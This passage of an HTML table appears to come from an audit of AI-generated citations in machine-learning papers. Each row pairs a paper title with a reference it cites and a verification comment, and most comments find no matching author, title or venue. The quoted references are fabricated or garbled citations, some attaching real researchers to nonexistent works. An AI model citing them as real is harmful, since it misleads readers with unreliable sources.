      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Junyan Zhu, Chenyang Li, Chao He, and et al. Freematch: A simple framework for long-tailed semi-supervised learning. In NeurIPS, 2021.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. This paper title is very close, but it was published by ICLR 2023 not NeurIPS 2021.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;NormFit: A Lightweight Solution for Few-Shot Federated Learning with Non-IID Data&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Scan&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Yijie Zang et al. Fedclip: A federated learning framework for vision-language models. In NeurIPS, 2023.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match, although this title is close. No match in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;AI-Generated Video Detection via Perceptual Straightening&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Jiahui Liu and et al. Tall-swin: Thumbnail layout transformer for generalised deepfake video detection. In ICCV, 2023.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. A paper with a similar title appears in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Multi-Expert Distributionally Robust Optimization for Out-of-Distribution Generalization&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Nitish Srivastava and Ruslan R Salakhutdinov. Discriminative features for fast frame-based phoneme classification. Neural networks, 47:17-23, 2013.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No title match, but authors have published together previously (example). No match in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;MIP against Agent: Malicious Image Patches Hijacking Multimodal OS Agents&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Anh Tuan Nguyen, Shengping Li, and Chao Qin. Multimodal adversarial robustness: Attack and defense. IEEE Transactions on Pattern Analysis and Machine Intelligence (TPAMI), 2021.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. Doesn't exist in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:77.25pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;ACT as Human: Multimodal Large Language Model Data Annotation with Critical Thinking&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Jack Lau, Ankan Gayen, Philipp Tschandl, Gregory A Burns, Jiahong Yuan, Tanveer SyedaMahmood, and Mehdi Moradi. A dataset and exploration of models for understanding radiology images through dialogue. In Proceedings of the Conference on Empirical Methods in Natural Language Processing (EMNLP), pages 2575-2584, 2018.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author match. Title matches another hallucinated citation in this paper. Doesn't exist in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;OCTDiff: Bridged Diffusion Model for Portable OCT Super-Resolution and Enhancement&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Yikai Zhang et al. "Text-to-Image Diffusion Models with Customized Guidance". In: Proceedings of the IEEE/CVF International Conference on Computer Vision. 2023.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. Doesn't exist in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;OCTDiff: Bridged Diffusion Model for Portable OCT Super-Resolution and Enhancement&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Author Song and AnotherAuthor Zhang. "Consistency in Diffusion Models: Improving Noise Embeddings". In: IEEE Transactions on Pattern Analysis and Machine Intelligence (2023). URL: https://arxiv.org/abs/2304.08787.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. This paper has a similar title. ArXiv ID leads to unrelated paper.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Strategic Costs of Perceived Bias in Fair Selection&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Claudia Goldin. Occupational choices and the gender wage gap. American Economic Review, 104(5):348-353, 2014.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Author is a famous economist, but the title doesn't match any of her works. Journal and locators match this unrelated article.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Linear Transformers Implicitly Discover Unified Numerical Algorithms&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Olah, C., Elhage, N., Nanda, N., Schiefer, N., Jones, A., Henighan, T., and DasSarma, N. (2022). Transformer circuits. Distill, 7(3). https://distill.pub/2022/circuits/.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Most authors match this paper, but the title, publisher, and year are different. Doesn't exist in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Linear Transformers Implicitly Discover Unified Numerical Algorithms&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Nanda, N. (2023). Progress in mechanistic interpretability: Reverse-engineering induction heads in GPT-2.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No title match. Author may be Neel Nanda, who wrote several similar articles in 2023.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;A Tri-Modal Multi-Agent Responsive Framework for Comprehensive 3D Object Annotation&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;J. Zhang and X. Li. Multi-agent systems for distributed problem solving: A framework for task decomposition and coordination. Procedia Computer Science, 55:1131-1138, 2015.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. Doesn't exist in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;A Tri-Modal Multi-Agent Responsive Framework for Comprehensive 3D Object Annotation&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Erfan Aghasian, Shai Avidan, Piotr Dollar, and Justin Johnson. Hierarchical protocols for multi-agent 3d scene understanding. In CVPR, pages 7664-7673, 2021.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. Doesn't exist in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Learning Grouped Lattice Vector Quantizers for Low-Bit LLM Compression&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Itay Hubara, Matthieu Courbariaux, Daniel Soudry, Rami El-Yaniv, and Yoshua Bengio. Quantizing deep convolutional networks for efficient inference: A whitepaper. arXiv preprint arXiv:1612.01462, 2017.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Authors mostly match this paper. Title matches this paper. ArXiv ID matches a third paper.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Learning Grouped Lattice Vector Quantizers for Low-Bit LLM Compression&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Zhiqiang Wang, Chao Zhang, Bing Li, Zhen Xu, and Zhiwei Li. A survey of model compression and acceleration for deep neural networks. ACM Computing Surveys, 54(7):1-34, 2021.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author match. Title matches this paper. Doesn't exist in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;PointMapPolicy: Structured Point Cloud Processing for Multi-Modal Imitation Learning&lt;/p&gt;
      &lt;/cell&gt;
